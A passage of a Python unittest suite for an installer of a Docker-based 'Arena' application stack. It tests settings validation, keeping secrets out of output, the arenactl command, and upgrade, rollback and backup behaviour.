    def env_values(self) -> dict[str, str]:
        return dict(line.split("=", 1) for line in (self.dir / "deploy" / ".env").read_text().splitlines() if "=" in line and not line.startswith("#"))

    def test_Settings_given_with_the_install_are_checked_before_anything_and_the_sandboxes_sized_for_this_host(self):
        # A setting there is none of, or a value that is none: refused before anything is done.
        for bad, said in (("NO_SUCH=1", "there is no setting NO_SUCH"), ("HTTPS_PORT=99999", "HTTPS_PORT is a port"),
                          ("IP_ALLOW=10.0.0.0/8,intranet", "not intranet"), ("THERMAL_POLICY=maybe", "one of: on off")):
            r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements", "--set", bad)
            self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
            self.assertIn(said, r.stdout + r.stderr)
            self.assertFalse((self.dir / "deploy").exists())
        secret = self.r.s.dir / "hf-token"
        secret.write_text("hf_a_token_for_the_test\n")
        r = self.install("--set", "SANDBOX_SLOTS=5", "--set", "IP_ALLOW=10.0.0.0/8,192.168.1.5", "--set", f"HF_TOKEN=@{secret}", "--set", "BACKUP_KEEP=30")
        values = self.env_values()
        self.assertEqual((values["SANDBOX_SLOTS"], values["IP_ALLOW"], values["HF_TOKEN"], values["BACKUP_KEEP"]), ("5", "10.0.0.0/8,192.168.1.5", "hf_a_token_for_the_test", "30"))
        self.assertNotIn("hf_a_token_for_the_test", self.output(r) + self.logs())
        self.assertIn(".env: HF_TOKEN set", r.stdout)
        # Those not given are sized for this host's CPUs and memory.
        for key in ("SANDBOX_MEMORY", "SANDBOX_CPUS", "BLENDER_SLOTS", "BLENDER_MEMORY", "BLENDER_CPUS"):
            self.assertRegex(values[key], r"^[0-9]+g?$", key)
        self.assertIn("the sandboxes sized for this host", r.stdout)

    def test_Config_lists_the_settings_and_changes_them_starting_again_what_they_touch(self):
        self.install()
        listed = self.own("config")
        self.assertEqual(listed.returncode, 0, self.output(listed))
        self.assertIn("Sandboxes", listed.stdout)
        self.assertRegex(listed.stdout, r"GITLAB_TOKEN\s+\(set\)")
        self.assertNotIn("glpat-a-token-for-the-test", listed.stdout)
        self.assertRegex(listed.stdout, r"DOMAIN\s+arena.test")
        before = (self.dir / "deploy" / ".env").read_text()
        self.assertEqual(self.own("config", "--set", "BLENDER_SLOTS=two", "--yes").returncode, 2)
        self.assertEqual(before, (self.dir / "deploy" / ".env").read_text())
        self.r.s.log.write_text("")
        changed = self.own("config", "--set", "BLENDER_SLOTS=3", "--set", "THERMAL_POLICY=off", "--yes")
        self.assertEqual(changed.returncode, 0, self.output(changed))
        self.assertEqual((self.env_values()["BLENDER_SLOTS"], self.env_values()["THERMAL_POLICY"]), ("3", "off"))
        self.assertIn(".env: BLENDER_SLOTS=3", changed.stdout)
        self.assertTrue(any(c[:3] == ["docker", "compose", "up"] or ("compose" in c and "up" in c) for c in self.r.calls()), self.r.calls()[-5:])
        # Again as they are: nothing to do.
        again = self.own("config", "--set", "BLENDER_SLOTS=3", "--yes")
        self.assertIn("as they were: nothing to do", again.stdout)

    def test_Arenactl_is_put_on_the_path_and_runs_the_installations_commands(self):
        bin_dir = self.r.s.dir / "cli-bin"
        self.install(extra_env={"ARENA_CLI_DIR": str(bin_dir)})
        link = bin_dir / "arenactl"
        self.assertTrue(link.is_symlink())
        self.assertEqual(os.readlink(link), str(self.dir / "deploy" / "scripts" / "arenactl"))
        env = self.r.env({"ARENA_CLI_DIR": str(bin_dir)})
        def cli(*args: str) -> subprocess.CompletedProcess:
            return subprocess.run([str(link), *args], env=env, capture_output=True, text=True, timeout=300, stdin=subprocess.DEVNULL)
        self.assertIn("arenactl status", cli("help").stdout)
        listed = cli("config")
        self.assertEqual(listed.returncode, 0, self.output(listed))
        self.assertRegex(listed.stdout, r"DOMAIN\s+arena.test")
        changed = cli("config", "--set", "LEAN_SLOTS=3", "--yes")
        self.assertEqual(changed.returncode, 0, self.output(changed))
        self.assertEqual(self.env_values()["LEAN_SLOTS"], "3")
        self.assertEqual(cli("check", "nonsense").returncode, 2)
        self.assertEqual(cli("upgrade").returncode, 2)
        # The admin's password is root's to reset: anyone else is refused, and nothing reaches the app.
        if os.geteuid() != 0:
            calls = len(self.r.calls())
            refused = cli("reset-admin-password", "--generate")
            self.assertEqual(refused.returncode, 1, self.output(refused))
            self.assertIn("needs root: sudo arenactl reset-admin-password", refused.stderr)
            self.assertFalse(any("reset-admin-password" in " ".join(c) for c in self.r.calls()[calls:]))
        self.assertIn("reset-admin-password", cli("help").stdout)
        # Purged: taken off the PATH with it.
        r = cli("remove", "--purge", "--confirm", "PURGE", "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertFalse(link.is_symlink())
        self.assertIn("arenactl taken off the PATH", r.stdout)

    def test_Install_sets_the_daily_backup_or_says_how(self):
        # Not root here: the timer is systemd's, so the install says how, and Admin -> Compliance shows the first backup due.
        r = self.install()
        self.assertIn(f"no daily backup yet: it needs root and systemd (sudo {self.dir / 'deploy'}/scripts/backup.sh --install-timer)", self.output(r))
        self.assertFalse((self.dir / "deploy" / "backups").exists() and any((self.dir / "deploy" / "backups").glob("20*")), "a backup was taken")

    def test_Install_writes_the_folder_env_and_override_and_starts_it(self):
        # A certificate of its own CA by default (--no-cert leaves Traefik's own).
        r = self.install()
        deploy = self.dir / "deploy"
        env = (deploy / ".env").read_text()
        self.assertEqual(oct((deploy / ".env").stat().st_mode & 0o777), "0o600")
        values = dict(line.split("=", 1) for line in env.splitlines() if "=" in line and not line.startswith("#"))
        self.assertEqual(values["DOMAIN"], "arena.test")
        self.assertEqual(values["HTTPS_PORT"], "18443")
        self.assertEqual(values["MODEL"], "")
        self.assertEqual(values["GITLAB_URL"], "https://gitlab.test")
        self.assertEqual(values["GITLAB_TOKEN"], "glpat-a-token-for-the-test")
        self.assertNotIn("glpat-a-token-for-the-test", self.output(r) + self.logs())
        for key in ("ADMIN_PASSWORD", "APP_KEY", "DB_PASSWORD", "ENGINE_KEY", "CODE_INTEL_KEY", "NEW_KEY"):
            self.assertGreaterEqual(len(values[key]), 24, key)
            self.assertNotIn(values[key], self.output(r) + self.logs(), key)
        self.assertNotIn("GATEWAY_KEY", values)
        # The data in folders of DATA_DIR on the host (its default: beside deploy/), made before it starts.
        self.assertEqual(values["DATA_DIR"], f"{self.dir}/data")
        for v in ("postgres", "engine"):
            self.assertTrue((self.dir / "data" / v).is_dir(), v)
        self.assertIn(f"data in {self.dir}/data", r.stdout)
        self.assertIn("not printed, as this run has no terminal", r.stdout)
        # No GPU (--cpu-only): the chat models are off, the rest of the defaults on.
        self.assertEqual(values["COMPOSE_PROFILES"], "knowledge,code-intel,monitoring,meetings")
        self.assertNotIn("llamacpp", [c["service"] for c in self.containers()])
        self.assertIn("code-intel", [c["service"] for c in self.containers()])
        override = (deploy / "docker-compose.override.yml").read_text()
        self.assertNotIn("llamacpp", override)
        # With a network an admin may download speech models later: the speech server is not kept offline.
        self.assertNotIn("HF_HUB_OFFLINE", override)
        self.assertTrue((deploy / "certs" / "tls.crt").is_file())
        for f in ("docs/deployment.md", "LICENSE.md", "VERSION", "code-arena/code-arena-9.9.9-linux-x64.tar.gz", "packs"):
            self.assertTrue((self.dir / f).exists(), f)
        state = (self.dir / ".arena-install" / "state").read_text()
        self.assertIn("version=9.9.9\n", state)
        self.assertIn("status=installed\n", state)
        self.assertEqual(sorted(c["service"] for c in self.containers()), sorted(SERVICES.split()))
        app = next(c for c in self.containers() if c["service"] == "app")
        self.assertEqual(app["image_id"], self.r.store()["images"]["arena-app:9.9.9"])
        self.assertIn("ok     app: 9.9.9 (its own /api/info)", r.stdout)
        self.assertIn("Arena 9.9.9 runs: https://arena.test:18443", r.stdout)
        # Asked through Traefik here, never through a proxy (which would not take --resolve).
        asks = [c for c in self.r.calls() if c[0] == "curl"]
        self.assertTrue(asks)
        self.assertTrue(all(c[c.index("--noproxy") + 1] == "*" for c in asks), asks)
        # Loaded quietly: the engines' progress lines are noise in a log.
        self.assertTrue(self.r.s.called("load", "-q"))
        # Third-party images that were here before: recorded so, and remove leaves them.
        rows = [line.split("\t") for line in (self.dir / ".arena-install" / "IMAGES").read_text().splitlines()]
        self.assertEqual([r_[2] for r_ in rows if r_[0] == "traefik:v3.6.7"], ["1"])
        self.assertEqual([r_[2] for r_ in rows if r_[0] == "arena-app:9.9.9"], ["0"])
        # Again: nothing breaks, nothing is loaded twice, .env kept.
        self.r.s.log.write_text("")
        r = self.install()
        self.assertEqual((deploy / ".env").read_text(), env)
        self.assertFalse(any(c[1:2] == ["load"] for c in self.r.calls()), "loaded again")

    def test_The_default_models_are_downloaded_by_the_app_once_when_chosen_and_otherwise_never(self):
        # Downloaded: the choice in .env (the app downloads them once, at its first start), and a repo:quant is a fine MODEL.
        self.install("--default-models", "download", "--model", "acme/Tiny-GGUF:Q4_K_M")
        env = (self.dir / "deploy" / ".env").read_text()
        self.assertIn("DEFAULT_MODELS=download\n", env)
        self.assertIn("MODEL=acme/Tiny-GGUF:Q4_K_M\n", env)

    def test_The_default_models_are_copied_from_a_folder_and_nothing_is_downloaded(self):
        folder = self.r.s.dir / "usb"
        (folder / "acme" / "Tiny-GGUF").mkdir(parents=True)
        (folder / "acme" / "Tiny-GGUF" / "Tiny-Q4_K_M.gguf").write_text("weights\n")
        (folder / "image").mkdir()
        (folder / "image" / "flux.gguf").write_text("pictures\n")
        models = self.dir / "models"
        (models / "image").mkdir(parents=True)
        (models / "image" / "flux.gguf").write_text("here already\n")
        r = self.install("--default-models", str(folder), "--models-dir", str(models), "--model", "acme/Tiny-GGUF:Q4_K_M")
        self.assertEqual((models / "acme" / "Tiny-GGUF" / "Tiny-Q4_K_M.gguf").read_text(), "weights\n")
        # What was there already is kept.
        self.assertEqual((models / "image" / "flux.gguf").read_text(), "here already\n")
        self.assertIn("1 model file(s) copied from", r.stdout)
        self.assertNotIn("DEFAULT_MODELS=download", (self.dir / "deploy" / ".env").read_text())
        # Models from a folder: the speech server uses those and never looks for others.
        self.assertIn('HF_HUB_OFFLINE: "1"', (self.dir / "deploy" / "docker-compose.override.yml").read_text())

    def test_A_default_models_choice_that_is_none_of_the_three_is_refused(self):
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--default-models", "/no/such/folder")
        self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
        self.assertIn("--default-models is download, skip, or a folder", r.stderr)

    def test_Without_a_GitLab_CodeIntel_is_left_out_and_said_so(self):
        r = self.install(gitlab=False)
        env = (self.dir / "deploy" / ".env").read_text()
        self.assertIn("\nCOMPOSE_PROFILES=knowledge,monitoring,meetings\n", env)
        self.assertIn("code-intel is off", r.stdout)
        self.assertIn("installer.sh repair --with code-intel", r.stdout)
        self.assertNotIn("code-intel", [c["service"] for c in self.containers()])
        r = self.r.run("install", "--dir", str(self.r.s.dir / "x"), "--yes", "--project", "other", "--gitlab-url", "https://gitlab.test")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("--gitlab-url needs its token", r.stderr)

    def test_An_upgrade_does_not_wait_for_a_service_that_was_down_before_it(self):
        self.old_install(version_file=True)
        store = self.r.store()
        next(c for c in store["containers"] if c["service"] == "argus")["state"] = "restarting"
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_DOWN": "code-intel"})
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertRegex(r.stdout, r"not up before the upgrade: (\S+ )*argus ")
        self.assertIn("not up, as before the upgrade: code-intel: restarting", r.stdout)
        # Down after the upgrade but up before: that fails it.
        shutil.rmtree(self.dir)
        self.r.state.write_text(json.dumps(self.pristine))
        self.old_install(version_file=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_DOWN": "web"})
        self.assertEqual(r.returncode, 5, self.output(r))
        self.assertIn("web: restarting", r.stdout)

    def test_Install_refuses_a_folder_or_project_that_has_an_installation(self):
        self.old_install()
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("did not make: upgrade it", r.stderr)
        other = self.r.s.dir / "other"
        r = self.r.run("install", "--dir", str(other), "--yes", "--cpu-only", "--skip-requirements")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("a stack named arena runs", r.stderr)
        self.assertFalse(other.exists())

    def test_A_failed_requirement_stops_install_before_anything(self):
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--domain", "arena.test",
                       extra={"PATH": f"{self.r.s.bin}:/usr/bin:/bin", "FAKE_NO_GPU": "1", "ARENA_GPU_HARDWARE": "no"})
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("no NVIDIA GPU", r.stdout)
        self.assertIn("--cpu-only", r.stdout)
        self.assertFalse(any(c[1:2] == ["load"] for c in self.r.calls()))

    # ---------------------------------------------------------------- upgrade

    def test_An_upgrade_from_a_release_with_the_feature_argus_keeps_it_on_as_code_intel_and_asks_nothing_about_it(self):
        deploy = self.old_install()
        # A 7.x installation: its list of features names the code-intelligence service argus, and it is on.
        (deploy / "features").write_text(FEATURES.replace("code-intel       | on  | code-intel", "argus | on  | argus"))
        with open(deploy / ".env", "a") as f:
            f.write("COMPOSE_PROFILES=chat-models,knowledge,argus,monitoring,meetings\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertNotIn("new in 9.9.9, off: code-intel", r.stdout)
        self.assertNotIn("the feature argus is not in", r.stdout)
        profiles = [line for line in (deploy / ".env").read_text().splitlines() if line.startswith("COMPOSE_PROFILES=")]
        self.assertEqual(len(profiles), 1, profiles)
        self.assertIn("code-intel", profiles[0].split("=", 1)[1].split(","))
        self.assertNotIn("argus", profiles[0].split("=", 1)[1].split(","))

    def test_An_upgrade_never_walks_the_stacks_data_kept_inside_deploy(self):
        deploy = self.old_install()
        # A checkout's deploy/ as the installation, its data inside it (DATA_DIR=deploy/data): the stack's, never deploy's files.
        for i in range(3):
            (deploy / "data" / "code-intel" / f"page-{i}.md").parent.mkdir(parents=True, exist_ok=True)
            (deploy / "data" / "code-intel" / f"page-{i}.md").write_text("an indexed page\n")
        env = (deploy / ".env").read_text()
        (deploy / ".env").write_text(re.sub(r"(?m)^DATA_DIR=.*$", f"DATA_DIR={deploy}/data", env) if "DATA_DIR=" in env else env + f"DATA_DIR={deploy}/data\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertNotIn("data/code-intel/page-", r.stdout)
        self.assertTrue((deploy / "data" / "code-intel" / "page-0.md").exists())

    def test_An_upgrade_from_before_8_0_drops_LiteLLMs_database_only_after_its_backup_and_once_the_app_has_its_data(self):
        deploy = self.old_install()
        # LiteLLM's replicas on (7.x's ha.yml in COMPOSE_FILE): 8.0 has no ha.yml, so it goes from COMPOSE_FILE, and back on a rollback.
        (deploy / "ha.yml").write_text("services: {}\n")
        with open(deploy / ".env", "a") as f:
            f.write("COMPOSE_FILE=docker-compose.yml:ha.yml\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("done   LiteLLM's database dropped", r.stdout)
        self.assertIn("COMPOSE_FILE without ha.yml", r.stdout)
        self.assertIn("COMPOSE_FILE=docker-compose.yml\n", (deploy / ".env").read_text())
        back = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes", "--timeout", "5s")
        self.assertEqual(back.returncode, 0, self.output(back))
        self.assertIn("COMPOSE_FILE=docker-compose.yml:ha.yml\n", (deploy / ".env").read_text())
        calls = [" ".join(c) for c in self.r.calls()]
        dropped = next(i for i, c in enumerate(calls) if "drop-litellm-database" in c)
        self.assertLess(next(i for i, c in enumerate(calls) if "pg_dumpall" in c), dropped)
        self.assertIn("--wait 600", calls[dropped])
        # The app still importing: kept, said so, and the upgrade is done all the same.
        shutil.rmtree(self.dir)
        self.r.state.write_text(json.dumps(self.pristine))
        self.old_install()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", extra={"FAKE_DROP_RC": "3"})
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("LiteLLM's database is kept for now", r.stdout)
        self.assertIn("Upgraded from", r.stdout)

    def test_Upgrade_from_5_2_0_backs_up_updates_merges_and_runs_the_new_release(self):
        deploy = self.old_install()
        # The compose file changed here too (its changes belong in the override).
        with open(deploy / "docker-compose.yml", "a") as f:
            f.write("# mine\n")
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        # A backup first, with backup.sh, taken before anything changed.
        backups = sorted((deploy / "backups").glob("20*_*"))
        self.assertEqual(len(backups), 1, out)
        self.assertEqual((backups[0] / "RESULT").read_text().strip(), "ok")
        self.assertEqual((backups[0] / "config" / ".env").read_text(), OLD_ENV)
        self.assertIn("backup: " + str(backups[0]), out)
        # Files, three ways (5.2.0's, 9.9.9's, the host's): the shipped ones updated, a dropped one
        # removed, the host's own kept. Changed here and in the release: the host's stays in effect,
        # the release's beside it, to merge.
        self.assertEqual((deploy / "config" / "edited.yml").read_text(), "shipped: 1\nmine: yes\n")
        self.assertEqual((deploy / "config" / "edited.yml.new-9.9.9").read_text(), "shipped: 2\n")
        self.assertFalse((deploy / "config" / "edited.yml.before-9.9.9").exists())
        # But the compose file is the release's: the host's copy beside it, to apply again in the override.
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_NEW)
        self.assertEqual((deploy / "docker-compose.yml.before-9.9.9").read_text(), COMPOSE_OLD + "# mine\n")
        # Changed here and not by the release: the host's stays in effect, and each is named at the end.
        self.assertEqual((deploy / "config" / "valkey.conf").read_text(), "model_list: []\nbudget: mine\n")
        self.assertFalse((deploy / "config" / "valkey.conf.before-9.9.9").exists())
        self.assertFalse((deploy / "config" / "valkey.conf.new-9.9.9").exists())
        self.assertIn("  TO MERGE: yours stay in effect, and 9.9.9 changed these files too; its copies are beside them:\n"
                      "    config/edited.yml  <-  config/edited.yml.new-9.9.9\n", out)
        self.assertIn("    docker-compose.yml  ->  docker-compose.yml.before-9.9.9\n", out)
        self.assertIn("kept as you changed them (9.9.9 ships them as they were): config/valkey.conf\n", out)
        # The embedding model is not here: healthy, waiting for models.
        self.assertIn("Upgraded from 5.2.0 to 9.9.9: healthy, waiting for models (embed; below)", out)
        # 5.2.0's data, in the engine's own volumes, moved into DATA_DIR's folders (copied, then the volumes removed).
        self.assertIn(f"DATA_DIR={self.dir}/data\n", (deploy / ".env").read_text())
        self.assertIn(f"2 volume(s) moved into {self.dir}/data", out)
        for v in ("postgres", "engine"):
            self.assertTrue((self.dir / "data" / v).is_dir(), v)
            self.assertTrue(self.r.s.called("volume", "rm", f"arena_{v}"), v)
        self.assertFalse((deploy / "config" / "dropped.yml").exists())
        self.assertEqual((deploy / "config" / "mine.yml").read_text(), "my own\n")
        self.assertEqual((deploy / "certs" / "tls.key").read_text(), "KEY\n")
        # .env: the old values as they were (a key from before 8.0 under its new name, on its own line), the new keys
        # added, nothing removed; the code-intelligence service keeps the address it had (argus.DOMAIN).
        env = (deploy / ".env").read_text()
        self.assertTrue(env.startswith(OLD_ENV.replace("ARGUS_KEY=old-argus", "CODE_INTEL_KEY=old-argus")), env)
        self.assertNotIn("ARGUS_KEY", env)
        self.assertIn("\nCODE_INTEL_HOST=argus\n", env)
        self.assertIn(".env: ARGUS_KEY is CODE_INTEL_KEY now", out)
        self.assertIn("\nNEW_SETTING=on\n", env)
        new_key = [line for line in env.splitlines() if line.startswith("NEW_KEY=")][0].split("=", 1)[1]
        self.assertGreaterEqual(len(new_key), 32)
        self.assertNotIn(new_key, self.output(r) + self.logs())
        self.assertNotIn("old-app-key", self.output(r) + self.logs())
        self.assertEqual(oct((deploy / ".env").stat().st_mode & 0o777), "0o600")
        # The new release runs; the old images stay for a rollback.
        images = self.r.store()["images"]
        app = next(c for c in self.containers() if c["service"] == "app")
        self.assertEqual(app["image_id"], images["arena-app:9.9.9"])
        self.assertIn(old_app, [v for k, v in images.items() if k.startswith("arena-rollback:5.2.0-")])
        self.assertIn("Upgraded from 5.2.0 to 9.9.9", out)
        self.assertIn(".env: 4 key(s) added (COMPOSE_PROFILES NEW_SETTING NEW_KEY DATA_DIR)\n", out)
        self.assertIn("version=9.9.9\n", (self.dir / ".arena-install" / "state").read_text())
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())
        # Again: nothing to do.
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("nothing to upgrade", r.stdout)
        # What the upgrade kept as the admin's is not damage: repair and verify leave it.
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("kept as you changed them (the install or upgrade left them so): config/edited.yml config/valkey.conf", r.stdout)
        self.assertEqual((deploy / "config" / "valkey.conf").read_text(), "model_list: []\nbudget: mine\n")
        self.assertEqual((deploy / "config" / "edited.yml").read_text(), "shipped: 1\nmine: yes\n")
        self.assertFalse(list((deploy / "config").glob("*.changed-*")))
        r = subprocess.run(["bash", str(deploy / "scripts" / "installer.sh"), "verify", "--dir", str(self.dir)], env=self.r.env(),
                           capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, self.output(r))
        # Changed again since: that is a finding.
        (deploy / "config" / "valkey.conf").write_text("budget: changed again\n")
        r = subprocess.run(["bash", str(deploy / "scripts" / "installer.sh"), "verify", "--dir", str(self.dir)], env=self.r.env(),
                           capture_output=True, text=True)
        self.assertEqual(r.returncode, 6, self.output(r))
        self.assertIn("config/valkey.conf", r.stdout)

    def test_An_upgrade_needs_disk_only_for_the_images_it_loads(self):
        # The images here already as the bundle has them are not loaded again: 7.7.0 asked for room for every one
        # (140 GB with every feature on, of which 18 of 29 images were there), and refused a host with less.
        self.old_install(version_file=True)
        rows = [line.split("\t") for line in (self.r.unpack() / "images" / "IMAGES").read_text().splitlines() if line]
        store = self.r.store()["images"]
        loads = [row for row in rows if store.get(row[0]) != row[2].removeprefix("sha256:") and row[0] != "python:3.13-slim"]
        self.assertTrue(loads and len(loads) < len(rows), rows)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        need = sum(int(row[4]) for row in loads if row[0] != "arena-laya:9.9.9") * 11 // 10 // 1024
        line = next(x for x in r.stdout.splitlines() if "disk for the images:" in x)
        self.assertTrue(line.endswith(f", {self.human(need * 1024)} needed"), line)

    def test_An_upgrade_a_requirement_stops_goes_on_with_skip_requirements(self):
        # The refusal named --skip-requirements, which upgrade did not take ("--skip-requirements is for install"): a
        # host that knew better than a check had no way on.
        self.old_install(version_file=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--docker", "--yes", "--timeout", "5s", extra={"FAKE_INFO_FAIL": "1"})
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("docker does not answer (docker info)", r.stdout)
        self.assertIn("nothing was changed; --skip-requirements goes on anyway", r.stderr)
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())
        r = self.r.run("upgrade", "--dir", str(self.dir), "--docker", "--yes", "--timeout", "5s", "--skip-requirements",
                       extra={"FAKE_INFO_FAIL": "1"})
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("1 requirement(s) not met; going on (--skip-requirements)", r.stdout)
        self.assertIn("Upgraded from 5.2.0 to 9.9.9", r.stdout)

    def human(self, n: int) -> str:
        """installer.sh's human()."""
        units, i, v = ["B", "KB", "MB", "GB", "TB"], 0, float(n)
        while v >= 1024 and i < 4:
            v, i = v / 1024, i + 1
        return f"{int(v)} B" if i == 0 else f"{v:.1f} {units[i]}"

    def test_An_app_that_answers_a_few_seconds_late_is_waited_for(self):
        """Traefik reaches a recreated container a little after compose calls it healthy."""
        deploy = self.old_install(version_file=True)
        # Written as compose also reads them.
        with open(deploy / ".env", "a") as f:
            f.write("export NEW_SETTING=off\nNEW_KEY = mine\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "20s", extra={"FAKE_CURL_LATE": "2"})
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("ok     app: 9.9.9 (its own /api/info)", r.stdout)
        # .env had every key already: none added, the values kept.
        self.assertIn("  .env: 2 key(s) added (COMPOSE_PROFILES DATA_DIR)\n", r.stdout)
        env = (deploy / ".env").read_text()
        # Theirs kept as they wrote them; only DATA_DIR, which this release adds, after them.
        self.assertIn("export NEW_SETTING=off\nNEW_KEY = mine\n", env)
        self.assertTrue(env.rstrip().endswith(f"DATA_DIR={self.dir}/data"), env)
        Path(str(self.r.s.log) + ".info-asks").unlink(missing_ok=True)

    def test_An_upgrade_makes_again_a_container_compose_keeps_on_a_moved_tag(self):
        # web's image of 9.9.9 is 5.2.0's packed again: arena-web names a new id, and compose, seeing the same
        # content, keeps the container on the old one. The versions are checked by id: it is made again.
        self.old_install(version_file=True)
        # Its data in DATA_DIR already, as a release this installer put there: nothing is moved, so the stack is not
        # taken down, and compose finds the containers it made before.
        store = self.r.store()
        for v in ("postgres", "engine"):
            store["volumes"][f"arena_{v}"]["device"] = str(self.dir / "data" / v)
        self.r.state.write_text(json.dumps(store))
        old_web = next(c for c in self.containers() if c["service"] == "web")["image_id"]
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", extra={"FAKE_SAME_CONTENT": "arena-web"})
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("done   made again from the image its reference names: web\n", r.stdout)
        self.assertNotIn("runs an older image", r.stdout)
        web = next(c for c in self.containers() if c["service"] == "web")
        self.assertEqual(web["image_id"], self.r.store()["images"]["arena-web:latest"])
        self.assertNotEqual(web["image_id"], old_web)
        recreated = [c for c in self.r.calls() if c[1:2] == ["compose"] and "--force-recreate" in c]
        self.assertEqual([c[-1] for c in recreated], ["web"])

    def test_A_failed_upgrade_rolls_back_files_images_and_data(self):
        deploy = self.old_install()
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_UNHEALTHY": "arena-app:9.9.9"})
        self.assertEqual(r.returncode, 4, self.output(r))
        out = r.stdout
        self.assertIn("The upgrade to 9.9.9 failed (above). Rolling back to 5.2.0.", out)
        self.assertIn("Rolled back: 5.2.0 runs again", out)
        # The files and .env as they were, nothing the upgrade added left behind.
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_OLD)
        self.assertEqual((deploy / ".env").read_text(), OLD_ENV)
        self.assertEqual((deploy / "config" / "dropped.yml").read_text(), "old: 1\n")
        self.assertFalse((deploy / "config" / "added.yml").exists())
        self.assertEqual((deploy / "config" / "edited.yml").read_text(), "shipped: 1\nmine: yes\n")
        self.assertFalse((deploy / "config" / "edited.yml.new-9.9.9").exists())
        # 5.2.0 had no VERSION beside deploy/; the upgrade's is gone again.
        self.assertFalse((self.dir / "VERSION").exists())
        # The old images, and the data of the backup (restored by backup.sh, after keeping what the failed one left).
        app = next(c for c in self.containers() if c["service"] == "app")
        self.assertEqual(app["image_id"], old_app)
        self.assertTrue(any("find /target -mindepth 1 -delete" in " ".join(c) for c in self.r.calls()))
        self.assertTrue(list((self.dir / ".arena-install" / "rollback" / "5.2.0" / "data-before-rollback").glob("20*")))
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())
        # The images it loaded are known, so remove takes them too.
        self.assertIn("arena-app:9.9.9\t", (self.dir / ".arena-install" / "IMAGES").read_text())
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertNotIn("arena-app:9.9.9", self.r.store()["images"])

    def test_Rollback_goes_back_to_the_release_and_data_before_the_upgrade(self):
        deploy = self.old_install()
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        snap = self.dir / ".arena-install" / "rollback" / "5.2.0"
        # Without a backup of the data as it is now, nothing is rolled back.
        (snap / "data-before-rollback").write_text("in the way\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 1, self.output(r))
        self.assertIn("nothing was rolled back", self.output(r))
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_NEW)
        (snap / "data-before-rollback").unlink()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--dry-run")
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("would  stop it but postgres, back up the data as it is, put back 5.2.0's images", out)
        self.assertIn("would  take out what the upgrade added: branding.env config/added.yml config/edited.yml.new-9.9.9", out)
        self.assertIn("would  put back as 5.2.0 had them: .env.example config/dropped.yml docker-compose.yml", out)
        self.assertIn("would  put back .env as 5.2.0 had it (it is as the upgrade left it: only the keys it added go)", out)
        self.assertIn("the certificates, the override and your other files stay as they are", out)
        self.assertFalse((snap / "old-deploy").exists())
        # A week on: a new certificate and key, and the override changed.
        upgraded_env = (deploy / ".env").read_text()
        (deploy / "certs" / "tls.key").write_text("NEW KEY\n")
        (deploy / "certs" / "tls.crt").write_text("NEW CERTIFICATE\n")
